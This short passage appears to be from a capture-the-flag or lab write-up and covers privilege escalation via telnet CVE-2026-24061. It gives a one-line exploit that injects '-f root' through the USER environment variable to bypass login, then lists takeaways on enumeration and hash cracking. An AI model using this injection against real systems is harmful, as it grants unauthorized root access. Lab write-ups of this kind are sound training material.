👑 Privilege Escalation — Telnet CVE-2026-24061

Discovery

Exploitation

env USER='-f root' telnet -a 127.0.0.1 23

📊 Key Takeaways

  • Unauthenticated CMS RCEs are high-value — Check /admin/login version banners
  • Internal port 23 raises alarms — Enumerate with ss -tulpn
  • Environment variable injection in telnet — CVE-2026-24061 creates trivial auth bypass
  • Bcrypt hashes can be cracked — Always attempt cracking before moving on
